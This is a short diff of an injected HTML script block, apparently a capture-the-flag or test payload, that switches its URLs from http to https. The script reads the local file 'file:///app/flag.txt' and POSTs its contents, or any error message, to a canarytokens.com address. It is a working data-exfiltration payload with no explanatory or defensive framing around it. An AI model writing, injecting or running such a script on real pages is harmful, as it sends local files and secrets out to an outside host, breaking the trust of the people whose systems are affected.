@@ -1,15 +1,15 @@
 <script>
-  fetch('http://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js');
+  fetch('https://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js');
 fetch('file:///app/flag.txt')
   .then(response => response.text())
   .then(data => {
-    fetch('http://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js', {
+    fetch('https://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js', {
       method: 'POST',
       body: 'flag=' + encodeURIComponent(data)
     });
   })
   .catch(error => {
-    fetch('http://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js', {
+    fetch('https://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js', {
       method: 'POST',
       body: 'error=' + encodeURIComponent(error.toString())
     });
